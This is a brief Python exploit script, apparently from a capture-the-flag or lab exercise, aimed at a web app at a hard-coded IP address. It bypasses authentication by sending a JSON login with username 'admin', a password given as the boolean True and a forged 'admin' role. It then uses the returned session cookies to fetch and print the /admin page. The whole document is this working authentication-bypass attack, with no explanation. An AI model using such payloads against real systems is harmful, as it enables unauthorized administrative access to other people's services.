import requests

url = "http://18.212.136.134:5200/api/authenticate"

payload = {
    "username": "admin",
    "password": True,
    "role": "admin",
    "remember": True
}

r = requests.post(url, json=payload)
print("Cookies:", r.cookies)

admin = requests.get("http://18.212.136.134:5200/admin", cookies=r.cookies)
print(admin.text)
